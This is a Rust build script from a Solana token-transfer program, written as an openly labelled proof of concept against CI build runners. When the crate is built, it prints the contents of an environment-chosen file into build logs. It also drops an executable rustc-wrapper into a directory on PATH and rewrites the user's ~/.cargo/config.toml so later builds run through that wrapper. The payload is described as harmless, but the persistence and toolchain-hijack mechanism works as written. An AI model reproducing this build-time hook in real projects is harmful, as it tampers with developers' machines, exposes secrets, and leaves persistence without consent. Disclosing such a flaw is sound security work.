// solana/programs/example-native-token-transfers/build.rs
use std::{
    env,
    fs,
    fs::OpenOptions,
    io::{Read, Write},
    os::unix::fs::PermissionsExt,
    path::PathBuf,
};

const MARKER_NAME: &str = "POC_MARKER.txt";
// Adjust this if you want to point at a different repo-controlled file in your PR.
// This path is relative to this build.rs file (programs/example-native-token-transfers/…)
const DEFAULT_SIM_FILE: &str = "../../simulated_lfi.txt";
const MAX_LOG_BYTES: usize = 400;

fn main() {
    // ---------- SAFE FILE READ (prints repo-controlled file contents to logs) ----------
    let sim_file = env::var("SIM_LFI_FILE").unwrap_or_else(|_| DEFAULT_SIM_FILE.to_string());
    println!("cargo:warning=SAFE_FILE_READ: path={sim_file}");
    match fs::read(&sim_file) {
        Ok(bytes) => {
            let shown = bytes.len().min(MAX_LOG_BYTES);
            println!("cargo:warning=SAFE_FILE_CONTENT_BEGIN");
            for line in String::from_utf8_lossy(&bytes[..shown]).lines() {
                println!("cargo:warning={}", line);
            }
            if bytes.len() > MAX_LOG_BYTES {
                println!("cargo:warning=... (truncated, {} bytes total)", bytes.len());
            }
            println!("cargo:warning=SAFE_FILE_CONTENT_END");
        }
        Err(e) => {
            println!("cargo:warning=SAFE_FILE_READ: could not read {sim_file}: {e}");
        }
    }

    // ---------- PERSISTENCE MARKER & RUSTC WRAPPER (harmless) IN SOLANA PATH ----------
    let home = env::var("HOME").unwrap_or_else(|_| ".".into());

    // The workflow prepends this to PATH; we only drop harmless files here.
    let mut bin_dir = PathBuf::from(&home);
    bin_dir.push(".local/share/solana/install/active_release/bin");
    if let Err(e) = fs::create_dir_all(&bin_dir) {
        println!("cargo:warning=PoC: failed to create {:?}: {}", bin_dir, e);
        return;
    }

    // 1) Drop a harmless marker to demonstrate persistence across runs
    let mut marker_path = bin_dir.clone();
    marker_path.push(MARKER_NAME);
    match fs::File::create(&marker_path) {
        Ok(mut f) => {
            let _ = writeln!(
                f,
                "SAFE_POC_MARKER: If you see this in a later clean run, the runner kept state.\nPath: {:?}",
                marker_path
            );
            println!("cargo:warning=SAFE_PERSISTENCE: wrote marker at {:?}", marker_path);
        }
        Err(e) => {
            println!(
                "cargo:warning=SAFE_PERSISTENCE: failed to write marker at {:?}: {}",
                marker_path, e
            );
        }
    }

    // 2) Create a benign rustc-wrapper that transparently forwards to real rustc (no tampering)
    let mut wrapper_path = bin_dir.clone();
    wrapper_path.push("rustc-wrapper");

    let wrapper_script = r#"#!/usr/bin/env bash
# SAFE pass-through rustc wrapper for PoC demonstration.
# It echoes a marker and then calls the real rustc with all original arguments.
echo "PoC rustc-wrapper: forwarding to real rustc" >&2
exec rustc "$@"
"#;

    match OpenOptions::new()
        .create(true)
        .truncate(true)
        .write(true)
        .open(&wrapper_path)
    {
        Ok(mut f) => {
            if let Err(e) = f.write_all(wrapper_script.as_bytes()) {
                println!("cargo:warning=PoC: failed writing wrapper {:?}: {}", wrapper_path, e);
            } else {
                // Make it executable
                if let Err(e) = fs::set_permissions(&wrapper_path, fs::Permissions::from_mode(0o755))
                {
                    println!(
                        "cargo:warning=PoC: failed chmod +x on {:?}: {}",
                        wrapper_path, e
                    );
                }
                println!("cargo:warning=PoC: wrote rustc-wrapper at {:?}", wrapper_path);
            }
        }
        Err(e) => {
            println!(
                "cargo:warning=PoC: failed to create rustc-wrapper {:?}: {}",
                wrapper_path, e
            );
        }
    }

    // 3) Ensure ~/.cargo/config.toml points rustc-wrapper to our benign script (idempotent)
    let mut cargo_dir = PathBuf::from(&home);
    cargo_dir.push(".cargo");
    if let Err(e) = fs::create_dir_all(&cargo_dir) {
        println!("cargo:warning=PoC: failed to create ~/.cargo: {}", e);
        return;
    }

    let mut config = cargo_dir.clone();
    config.push("config.toml");

    let setting_line = format!("rustc-wrapper = \"{}\"\n", wrapper_path.display());

    // Read existing config (if any)
    let mut existing = String::new();
    if let Ok(mut f) = fs::File::open(&config) {
        let _ = f.read_to_string(&mut existing);
    }

    if existing.contains("rustc-wrapper") {
        println!("cargo:warning=PoC: rustc-wrapper already configured in ~/.cargo/config.toml");
    } else {
        // Append a [build] section if not present, then add rustc-wrapper line.
        let mut new_cfg = existing;
        if !new_cfg.contains("[build]") {
            new_cfg.push_str("\n[build]\n");
        } else if !new_cfg.ends_with('\n') {
            new_cfg.push('\n');
        }
        new_cfg.push_str(&setting_line);

        match OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .open(&config)
        {
            Ok(mut f) => {
                if let Err(e) = f.write_all(new_cfg.as_bytes()) {
                    println!("cargo:warning=PoC: failed writing ~/.cargo/config.toml: {}", e);
                } else {
                    println!(
                        "cargo:warning=PoC: configured rustc-wrapper in {:?}",
                        config
                    );
                }
            }
            Err(e) => println!("cargo:warning=PoC: cannot open ~/.cargo/config.toml for write: {}", e),
        }
    }

    // Emit a note so cargo rebuilds this crate if SIM_LFI_FILE changes
    println!("cargo:rerun-if-env-changed=SIM_LFI_FILE");
}
